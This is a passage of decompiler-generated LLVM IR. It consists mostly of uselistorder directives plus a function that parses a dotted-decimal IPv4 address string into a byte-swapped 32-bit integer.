  uselistorder i32 65536, { 10, 9, 15, 11, 16, 12, 17, 13, 18, 14, 19, 20, 21, 25, 22, 26, 23, 27, 24, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62, 65, 64, 66, 1, 67, 68, 2, 69, 0, 3, 70, 71, 72, 73, 74, 77, 75, 76, 78, 79, 4, 80, 83, 84, 81, 85, 82, 86, 87, 88, 89, 90, 154, 92, 91, 155, 94, 93, 95, 97, 96, 99, 98, 156, 101, 100, 157, 103, 102, 104, 106, 105, 108, 107, 109, 110, 114, 115, 116, 117, 111, 112, 113, 118, 121, 122, 123, 119, 120, 124, 5, 125, 127, 128, 129, 126, 130, 6, 131, 135, 136, 137, 132, 133, 134, 138, 139, 140, 142, 141, 143, 7, 144, 146, 147, 145, 148, 8, 149, 151, 152, 150, 153 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 16777216, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 47, 46, 49, 48, 53, 50, 52, 51, 54, 56, 55, 58, 57, 60, 59, 62, 61, 63, 64, 65, 66, 69, 67, 70, 68, 71, 72, 74, 73, 80, 75, 81, 76, 82, 77, 83, 78, 84, 79, 85, 88, 89, 86, 87, 90, 91, 95, 92, 96, 93, 94, 97, 100, 101, 98, 99, 102, 103, 107, 104, 108, 105, 106, 109, 117, 110, 118, 111, 119, 112, 120, 121, 113, 122, 114, 123, 115, 124, 116, 128, 125, 129, 126, 130, 127, 131, 138, 132, 139, 140, 133, 141, 136, 142, 134, 143, 144, 135, 137, 145, 146, 150, 147, 151, 152, 148, 149, 153, 154, 155, 159, 156, 160, 157, 161, 158, 162, 163, 164, 169, 165, 170, 166, 171, 167, 172, 168, 173, 174, 175, 176, 177, 178, 180, 179, 181 }
  uselistorder i32* @r5, { 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 161, 162, 163, 164, 165, 166, 167, 168, 169, 173, 170, 171, 172, 174, 602, 603, 604, 605, 606, 0, 607, 608, 609, 610, 611, 612, 329, 330, 331, 332, 333, 334, 512, 513, 514, 515, 516, 517, 518, 525, 519, 520, 521, 522, 523, 524, 561, 562, 563, 570, 571, 572, 573, 564, 565, 566, 567, 568, 569, 29, 30, 31, 175, 176, 3, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 92, 93, 21, 20, 22, 23, 24, 25, 26, 94, 95, 27, 28, 96, 97, 98, 99, 100, 101, 110, 111, 112, 113, 102, 103, 104, 105, 106, 107, 108, 109, 4, 133, 134, 135, 136, 137, 138, 139, 338, 339, 340, 341, 342, 343, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 1, 132, 140, 141, 142, 143, 144, 145, 146, 5, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 2, 160, 188, 189, 190, 191, 192, 8, 193, 194, 195, 196, 197, 198, 199, 200, 9, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 6, 504, 505, 506, 507, 508, 509, 510, 511, 574, 575, 576, 577, 578, 579, 580, 581, 7, 582, 583, 584, 585, 586, 587, 588, 589, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 321, 322, 323, 324, 325, 326, 327, 328, 335, 336, 337 }
  uselistorder i32 -3, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 -5, { 1, 0 }
  uselistorder i32 11, { 6, 7, 8, 17, 18, 9, 10, 11, 12, 1, 13, 14, 0, 15, 16, 19, 20, 21, 22, 2, 23, 24, 25, 3, 26, 27, 28, 4, 29, 30, 31, 5, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 3, 4, 5, 22, 6, 23, 24 }
  uselistorder i32 48, { 0, 5, 6, 3, 4, 1, 7, 2, 8 }
  uselistorder i32 40, { 1, 7, 2, 0, 4, 5, 6, 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 36, { 1, 5, 6, 3, 4, 0, 2 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0 }
  uselistorder i32 -32, { 1, 0, 2, 3 }
  uselistorder i32 24, { 0, 72, 73, 37, 38, 1, 74, 75, 35, 36, 16, 15, 66, 45, 67, 46, 54, 58, 39, 40, 41, 42, 43, 44, 61, 47, 48, 49, 50, 51, 52, 53, 55, 56, 62, 57, 63, 59, 60, 68, 69, 70, 64, 65, 71, 17, 18, 19, 20, 2, 21, 22, 3, 23, 4, 5, 6, 7, 8, 9, 10, 78, 24, 11, 79, 25, 26, 12, 80, 27, 81, 82, 83, 28, 29, 13, 84, 30, 85, 31, 32, 14, 86, 33, 87, 88, 76, 34, 77 }
  uselistorder i32 16, { 31, 32, 33, 186, 34, 187, 188, 35, 189, 190, 36, 191, 192, 193, 194, 195, 196, 99, 100, 78, 79, 104, 101, 102, 103, 105, 26, 106, 107, 5, 6, 7, 8, 9, 25, 10, 11, 0, 12, 13, 49, 82, 37, 83, 38, 50, 80, 81, 84, 86, 87, 88, 27, 77, 14, 15, 24, 74, 16, 89, 17, 51, 85, 52, 91, 92, 39, 90, 40, 53, 54, 93, 55, 94, 56, 95, 57, 96, 58, 97, 59, 98, 60, 61, 108, 109, 63, 110, 111, 112, 113, 114, 1, 62, 115, 116, 117, 65, 118, 119, 120, 121, 122, 2, 64, 123, 66, 124, 125, 126, 18, 127, 19, 128, 75, 20, 67, 68, 129, 130, 3, 42, 131, 41, 132, 69, 133, 134, 135, 21, 136, 22, 137, 76, 23, 70, 71, 138, 139, 4, 44, 140, 43, 141, 28, 143, 144, 145, 146, 72, 147, 148, 149, 150, 151, 152, 153, 154, 29, 155, 156, 157, 158, 160, 159, 161, 162, 163, 164, 165, 166, 167, 30, 168, 169, 170, 171, 172, 174, 173, 175, 176, 177, 178, 179, 180, 73, 181, 182, 183, 46, 184, 45, 48, 185, 47, 142 }
  uselistorder i32 20, { 108, 3, 109, 110, 0, 4, 111, 30, 31, 21, 22, 1, 32, 33, 34, 35, 23, 25, 5, 26, 6, 27, 20, 24, 28, 29, 36, 37, 38, 7, 39, 40, 41, 42, 43, 44, 45, 46, 8, 47, 48, 49, 2, 50, 51, 52, 53, 16, 54, 55, 56, 57, 58, 59, 60, 61, 62, 17, 63, 64, 65, 66, 67, 68, 69, 71, 72, 9, 73, 74, 75, 76, 77, 78, 79, 10, 80, 81, 82, 83, 18, 19, 84, 12, 85, 11, 86, 87, 88, 89, 14, 90, 13, 91, 92, 93, 94, 95, 96, 97, 98, 15, 99, 100, 101, 102, 103, 104, 105, 106, 107, 70 }
  uselistorder i32 27, { 1, 0, 8, 3, 10, 2, 9, 4, 11, 5, 12, 6, 13, 7, 14 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 7, { 21, 22, 23, 61, 63, 0, 15, 28, 3, 17, 24, 18, 25, 19, 26, 16, 27, 1, 20, 29, 30, 31, 4, 32, 33, 5, 34, 35, 6, 36, 37, 7, 38, 39, 40, 41, 8, 42, 43, 44, 45, 9, 46, 47, 48, 49, 50, 10, 51, 52, 53, 54, 55, 11, 56, 57, 58, 59, 12, 60, 13, 14, 2, 62 }
  uselistorder i32 -8, { 16, 17, 18, 19, 20, 21, 15, 14, 7, 13, 12, 11, 10, 22, 23, 24, 25, 8, 26, 0, 29, 9, 27, 28, 6, 1, 2, 3, 5, 4 }
  uselistorder i32* @ip, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 2, 3, 48, 1, 0, 4, 5 }
  uselistorder i1 false, { 25, 26, 27, 35, 19, 24, 36, 37, 21, 22, 23, 38, 18, 39, 40, 0, 30, 29, 31, 28, 1, 3, 2, 16, 17, 4, 33, 15, 20, 34, 7, 6, 5, 8, 9, 10, 32, 11, 12, 14, 13, 41 }
  uselistorder i32 4, { 72, 63, 64, 6, 415, 65, 416, 53, 7, 8, 66, 417, 67, 418, 419, 420, 421, 68, 422, 423, 424, 425, 69, 426, 427, 428, 429, 430, 9, 431, 432, 433, 434, 435, 70, 436, 52, 437, 438, 439, 440, 441, 442, 10, 11, 71, 443, 251, 252, 181, 182, 253, 254, 255, 444, 445, 446, 447, 448, 125, 126, 127, 54, 128, 129, 396, 398, 397, 394, 395, 364, 365, 366, 367, 399, 400, 401, 402, 368, 369, 370, 403, 404, 130, 131, 132, 133, 134, 44, 12, 13, 256, 257, 258, 259, 260, 261, 14, 15, 59, 16, 17, 60, 405, 406, 179, 18, 19, 91, 73, 320, 310, 55, 192, 92, 193, 135, 194, 212, 213, 214, 206, 207, 51, 50, 215, 195, 196, 94, 183, 184, 185, 95, 186, 96, 187, 188, 189, 190, 191, 197, 198, 199, 200, 201, 202, 203, 204, 205, 93, 209, 210, 211, 208, 61, 216, 74, 97, 98, 20, 217, 21, 218, 219, 22, 220, 23, 221, 222, 46, 223, 45, 228, 99, 230, 100, 231, 101, 232, 233, 229, 224, 102, 225, 226, 227, 241, 136, 243, 24, 244, 245, 242, 25, 246, 47, 103, 247, 248, 407, 234, 58, 57, 56, 235, 104, 26, 27, 28, 29, 30, 236, 48, 237, 49, 238, 239, 240, 249, 137, 250, 0, 105, 262, 263, 138, 264, 265, 266, 267, 139, 140, 2, 268, 106, 269, 75, 270, 271, 272, 141, 273, 274, 142, 143, 3, 107, 275, 76, 276, 77, 277, 278, 144, 279, 280, 281, 282, 283, 145, 146, 284, 285, 109, 286, 4, 108, 287, 78, 288, 110, 289, 290, 147, 291, 292, 293, 294, 295, 148, 149, 296, 297, 112, 298, 5, 111, 299, 79, 300, 113, 301, 31, 311, 312, 150, 313, 314, 315, 151, 152, 115, 316, 114, 318, 80, 319, 321, 153, 322, 323, 154, 155, 324, 81, 325, 82, 326, 327, 328, 329, 156, 330, 331, 332, 157, 158, 117, 333, 116, 83, 334, 84, 335, 336, 337, 338, 339, 340, 119, 341, 120, 342, 159, 343, 344, 345, 160, 161, 121, 346, 118, 347, 85, 348, 86, 349, 350, 351, 162, 163, 352, 164, 353, 354, 165, 166, 122, 355, 87, 356, 88, 357, 358, 359, 360, 361, 123, 362, 89, 363, 408, 409, 410, 411, 124, 413, 90, 414, 167, 371, 372, 32, 168, 373, 374, 33, 169, 375, 376, 34, 170, 377, 378, 35, 171, 379, 380, 36, 172, 62, 381, 382, 37, 383, 173, 384, 385, 38, 174, 386, 387, 39, 175, 388, 389, 40, 176, 390, 391, 41, 177, 392, 393, 42, 412, 302, 303, 304, 305, 43, 306, 307, 1, 308, 178, 309, 317, 180 }
  uselistorder i32* @r2, { 68, 69, 30, 9, 31, 33, 32, 34, 35, 36, 37, 7, 70, 1, 71, 76, 77, 80, 72, 59, 63, 64, 67, 65, 66, 60, 61, 62, 58, 14, 0, 78, 2, 79, 5, 38, 39, 40, 8, 10, 73, 74, 75, 3, 41, 42, 43, 6, 26, 27, 28, 4, 44, 52, 55, 56, 53, 54, 57, 15, 11, 12, 13, 18, 19, 16, 17, 22, 23, 20, 21, 24, 25, 29, 45, 46, 47, 48, 49, 50, 51 }
  uselistorder label %dec_label_pc_14188, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1411c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14050, { 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb141, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_13fdc, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_13fa0, { 1, 0 }
  uselistorder label %dec_label_pc_13f8c, { 1, 0 }
  uselistorder label %dec_label_pc_13f4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13ee0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13e74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13e14, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %.thread119, { 1, 0 }
  uselistorder label %bb131, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread117, { 1, 0 }
  uselistorder label %dec_label_pc_13d88, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_13d48, { 1, 0 }
}

define i32 @function_141a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_141a8:
  ret i32 %arg1
}

define i32 @function_141b0() local_unnamed_addr {
dec_label_pc_141b0:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_141b0 = load i32, i32* @r0, align 4
  %v2_141b0 = icmp eq i32 %v0_141b0, 0
  %v3_141b4 = load i32, i32* @r4, align 4
  store i32 %v3_141b4, i32* %stack_var_-20, align 4
  %v0_141b8 = load i32, i32* @r1, align 4
  br i1 %v2_141b0, label %dec_label_pc_14290, label %dec_label_pc_141cc.lr.ph

dec_label_pc_141cc:                               ; preds = %dec_label_pc_141cc.lr.ph, %dec_label_pc_14250
  %v1_14250 = phi i32 [ 0, %dec_label_pc_141cc.lr.ph ], [ %v5_14250, %dec_label_pc_14250 ]
  %v0_14254 = phi i32 [ 1, %dec_label_pc_141cc.lr.ph ], [ %v1_14254, %dec_label_pc_14250 ]
  %v0_141d4 = phi i32 [ %v0_141b0, %dec_label_pc_141cc.lr.ph ], [ %v0_141d425, %dec_label_pc_14250 ]
  store i32 %v2_141d0.pre, i32* @lr, align 4
  %v1_141d4 = inttoptr i32 %v0_141d4 to i8*
  %v2_141d4 = load i8, i8* %v1_141d4, align 1
  %v3_141d4 = zext i8 %v2_141d4 to i32
  %v3_141d8 = mul nuw nsw i32 %v3_141d4, 2
  %v4_141d8 = add i32 %v3_141d8, %v2_141d0.pre
  %v5_141d8 = inttoptr i32 %v4_141d8 to i8*
  %v6_141d8 = load i8, i8* %v5_141d8, align 1
  %v1_141dc = and i8 %v6_141d8, 8
  %v2_141dc = icmp eq i8 %v1_141dc, 0
  br i1 %v2_141dc, label %dec_label_pc_14290, label %dec_label_pc_141e4

dec_label_pc_141e4:                               ; preds = %dec_label_pc_141cc
  br label %dec_label_pc_14204

dec_label_pc_141ec:                               ; preds = %dec_label_pc_14204
  %v3_141f0 = mul i32 %v0_14250, 10
  %v4_141f0 = add i32 %v3_14204, %v3_141f0
  %v1_141f4 = add i32 %v4_141f0, -48
  %v8_141fc = icmp sgt i32 %v1_141f4, 255
  br i1 %v8_141fc, label %dec_label_pc_14290, label %dec_label_pc_14200

dec_label_pc_14200:                               ; preds = %dec_label_pc_141ec
  %v1_14200 = add i32 %v0_14240, 1
  store i32 %v1_14200, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14204

dec_label_pc_14204:                               ; preds = %dec_label_pc_141e4, %dec_label_pc_14200
  %v0_14250 = phi i32 [ 0, %dec_label_pc_141e4 ], [ %v1_141f4, %dec_label_pc_14200 ]
  %v0_14240 = phi i32 [ %v0_141d4, %dec_label_pc_141e4 ], [ %v1_14200, %dec_label_pc_14200 ]
  %v1_14204 = inttoptr i32 %v0_14240 to i8*
  %v2_14204 = load i8, i8* %v1_14204, align 1
  %v3_14204 = zext i8 %v2_14204 to i32
  %v2_14208 = mul nuw nsw i32 %v3_14204, 2
  %v2_1420c = add i32 %v2_14208, %v2_141d0.pre
  %v3_14210 = inttoptr i32 %v2_1420c to i8*
  %v4_14210 = load i8, i8* %v3_14210, align 1
  %v6_14210 = zext i8 %v4_14210 to i32
  %v1_1421c = and i32 %v6_14210, 8
  %v2_1421c = icmp eq i32 %v1_1421c, 0
  br i1 %v2_1421c, label %dec_label_pc_14224, label %dec_label_pc_141ec

dec_label_pc_14224:                               ; preds = %dec_label_pc_14204
  %v8_14228 = icmp sgt i32 %v0_14254, 3
  br i1 %v8_14228, label %dec_label_pc_1423c, label %dec_label_pc_1422c

dec_label_pc_1422c:                               ; preds = %dec_label_pc_14224
  %v7_1422c = icmp eq i8 %v2_14204, 46
  br i1 %v7_1422c, label %dec_label_pc_14234, label %dec_label_pc_14290

dec_label_pc_14234:                               ; preds = %dec_label_pc_1422c
  %v1_14234 = add i32 %v0_14240, 1
  store i32 %v1_14234, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14250

dec_label_pc_1423c:                               ; preds = %dec_label_pc_14224
  %v2_1423c = icmp eq i8 %v2_14204, 0
  %v1_14240 = add i32 %v0_14240, 1
  store i32 %v1_14240, i32* %r0.global-to-local, align 4
  br i1 %v2_1423c, label %dec_label_pc_14250, label %dec_label_pc_14248

dec_label_pc_14248:                               ; preds = %dec_label_pc_1423c
  %v1_14248 = and i32 %v6_14210, 32
  %v2_14248 = icmp eq i32 %v1_14248, 0
  br i1 %v2_14248, label %dec_label_pc_14290, label %dec_label_pc_14250

dec_label_pc_14250:                               ; preds = %dec_label_pc_14248, %dec_label_pc_1423c, %dec_label_pc_14234
  %v0_141d425 = phi i32 [ %v1_14240, %dec_label_pc_14248 ], [ %v1_14240, %dec_label_pc_1423c ], [ %v1_14234, %dec_label_pc_14234 ]
  %v4_14250 = mul i32 %v1_14250, 256
  %v5_14250 = or i32 %v0_14250, %v4_14250
  %v1_14254 = add nuw nsw i32 %v0_14254, 1
  %v7_1425c = icmp slt i32 %v1_14254, 5
  br i1 %v7_1425c, label %dec_label_pc_141cc, label %dec_label_pc_14260

dec_label_pc_141cc.lr.ph:                         ; preds = %dec_label_pc_141b0
  %v2_141d0.pre = load i32, i32* bitcast (i32** @global_var_1ca5c.423 to i32*), align 4
  br label %dec_label_pc_141cc

dec_label_pc_14260:                               ; preds = %dec_label_pc_14250
  %v2_14260 = icmp eq i32 %v0_141b8, 0
  br i1 %v2_14260, label %bb, label %bb40

bb:                                               ; preds = %dec_label_pc_14260
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb40:                                             ; preds = %dec_label_pc_14260
  %v3_1427c = call i32 @llvm.bswap.i32(i32 %v5_14250)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_14288 = inttoptr i32 %v0_141b8 to i32*
  store i32 %v3_1427c, i32* %v3_14288, align 4
  %v2_1428c.pre = load i32, i32* %stack_var_-20, align 4
  %v17_1428c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb40
  %v17_1428c = phi i32 [ 1, %bb ], [ %v17_1428c.pre, %bb40 ]
  %v2_1428c = phi i32 [ %v3_141b4, %bb ], [ %v2_1428c.pre, %bb40 ]
  store i32 %v2_1428c, i32* @r4, align 4
  ret i32 %v17_1428c

dec_label_pc_14290:                               ; preds = %dec_label_pc_1422c, %dec_label_pc_14248, %dec_label_pc_141cc, %dec_label_pc_141ec, %dec_label_pc_141b0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_141b4, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_141d0.pre, { 2, 1, 0 }
  uselistorder i32 %v1_14254, { 1, 0 }
  uselistorder i32 %v0_14240, { 0, 1, 3, 2 }
  uselistorder i32 %v3_141b4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 4, 5, 6 }
  uselistorder i32 5, { 17, 27, 18, 6, 19, 7, 3, 21, 28, 22, 29, 23, 30, 20, 31, 4, 1, 0, 32, 33, 34, 24, 25, 26, 35, 36, 8, 37, 38, 39, 9, 40, 41, 42, 43, 10, 44, 45, 46, 47, 11, 48, 52, 53, 54, 55, 12, 56, 57, 58, 59, 13, 60, 61, 62, 63, 64, 65, 66, 14, 67, 68, 69, 70, 71, 72, 73, 15, 74, 75, 76, 77, 78, 79, 80, 81, 16, 82, 5, 83, 49, 2, 50, 51 }
  uselistorder i32 256, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 65, 66, 67, 63, 64, 68, 71, 72, 73, 69, 70, 74, 75, 76, 77, 78, 79, 496, 497, 80, 81, 82, 83, 84, 85, 86, 499, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 100, 101, 99, 104, 103, 102, 105, 494, 500, 110, 106, 109, 107, 108, 498, 111, 112, 113, 114, 501, 115, 116, 117, 118, 119, 502, 120, 121, 122, 123, 124, 125, 126, 127, 129, 128, 130, 131, 132, 135, 134, 133, 136, 138, 137, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 154, 153, 162, 158, 163, 159, 155, 156, 160, 157, 164, 165, 161, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 182, 181, 180, 188, 183, 194, 195, 189, 184, 196, 197, 190, 185, 198, 191, 199, 192, 200, 193, 201, 186, 202, 187, 203, 204, 205, 206, 207, 208, 209, 212, 213, 216, 214, 210, 217, 215, 211, 220, 219, 218, 223, 224, 221, 225, 222, 226, 230, 227, 232, 231, 228, 229, 233, 492, 503, 234, 235, 236, 237, 238, 241, 239, 240, 243, 242, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 259, 260, 263, 261, 257, 264, 262, 258, 267, 266, 265, 270, 271, 268, 272, 269, 273, 277, 274, 279, 278, 275, 276, 280, 493, 504, 281, 282, 283, 284, 285, 288, 286, 287, 290, 289, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 308, 307, 309, 310, 311, 315, 321, 316, 312, 317, 322, 318, 323, 319, 313, 324, 314, 325, 326, 320, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 338, 339, 337, 340, 343, 344, 342, 341, 345, 348, 347, 346, 355, 352, 356, 353, 349, 357, 354, 350, 351, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 369, 368, 370, 371, 373, 372, 374, 375, 376, 377, 380, 387, 381, 382, 378, 383, 384, 385, 379, 388, 386, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 402, 401, 403, 404, 405, 409, 416, 410, 411, 417, 412, 406, 407, 413, 408, 414, 418, 415, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 437, 436, 438, 439, 440, 451, 446, 441, 452, 447, 453, 448, 454, 449, 442, 443, 444, 455, 456, 457, 458, 450, 445, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 471, 470, 472, 473, 474, 475, 476, 477, 478, 480, 479, 481, 482, 483, 484, 485, 486, 488, 487, 489, 490, 491, 495 }
  uselistorder i32 32, { 51, 39, 40, 37, 47, 48, 42, 43, 46, 5, 4, 7, 6, 9, 8, 38, 36, 49, 50, 11, 10, 13, 12, 15, 14, 17, 16, 41, 19, 18, 21, 20, 22, 24, 23, 25, 26, 28, 27, 44, 45, 29, 0, 30, 1, 2, 3, 52, 53, 31, 54, 32, 33, 34, 35 }
  uselistorder i8 46, { 0, 1, 3, 2 }
  uselistorder i32 3, { 40, 64, 65, 167, 66, 67, 68, 69, 70, 71, 75, 92, 168, 4, 160, 162, 163, 0, 72, 23, 73, 24, 164, 74, 41, 25, 27, 76, 44, 77, 2, 78, 79, 80, 81, 42, 5, 82, 83, 84, 85, 26, 86, 45, 87, 43, 88, 46, 89, 47, 90, 91, 28, 48, 49, 50, 51, 52, 1, 93, 94, 95, 96, 97, 98, 99, 7, 6, 53, 100, 29, 101, 102, 103, 104, 105, 9, 8, 54, 106, 30, 107, 108, 109, 110, 55, 111, 11, 10, 32, 112, 31, 113, 114, 115, 116, 56, 117, 13, 12, 34, 118, 33, 119, 57, 121, 122, 123, 124, 125, 126, 58, 127, 59, 128, 35, 129, 130, 131, 132, 133, 15, 14, 60, 36, 134, 135, 136, 137, 138, 139, 17, 16, 61, 140, 37, 141, 142, 143, 144, 145, 146, 147, 19, 18, 62, 148, 38, 149, 150, 151, 152, 153, 154, 155, 21, 20, 63, 156, 39, 157, 158, 159, 165, 166, 22, 161, 3, 120 }
  uselistorder i32 8, { 100, 137, 23, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 24, 154, 65, 66, 67, 68, 72, 69, 70, 71, 155, 133, 132, 130, 131, 119, 120, 121, 134, 135, 136, 122, 123, 124, 7, 27, 28, 25, 26, 17, 18, 20, 21, 29, 156, 73, 74, 75, 76, 8, 9, 46, 19, 10, 11, 16, 12, 30, 52, 31, 13, 14, 15, 47, 36, 48, 37, 49, 38, 50, 39, 51, 22, 53, 54, 55, 56, 58, 40, 59, 41, 60, 61, 57, 62, 63, 42, 64, 77, 78, 79, 3, 80, 81, 82, 4, 83, 84, 85, 86, 87, 88, 89, 5, 90, 91, 92, 93, 94, 95, 96, 6, 101, 32, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 125, 33, 126, 34, 127, 35, 128, 43, 129, 0, 1, 45, 97, 98, 44, 99, 2 }
  uselistorder i32 255, { 2, 6, 7, 3, 8, 4, 9, 5, 10, 0, 1 }
  uselistorder i32 10, { 10, 43, 44, 0, 3, 4, 24, 25, 45, 1, 26, 30, 11, 29, 12, 31, 13, 32, 14, 33, 6, 34, 35, 27, 15, 36, 28, 37, 16, 38, 39, 40, 17, 5, 18, 19, 41, 20, 42, 8, 46, 47, 48, 49, 50, 51, 21, 52, 53, 54, 22, 55, 57, 58, 2, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 7, 72, 9, 73, 56, 23 }
  uselistorder i8 0, { 6, 0, 1, 23, 5, 24, 25, 2, 9, 26, 27, 28, 29, 30, 31, 32, 7, 33, 34, 35, 36, 37, 38, 3, 11, 10, 12, 41, 43, 40, 17, 42, 18, 44, 45, 39, 4, 46, 47, 48, 49, 50, 20, 51, 52, 55, 21, 53, 54, 19, 56, 57, 58, 59, 60, 13, 14, 8, 15, 61, 16, 22, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71 }
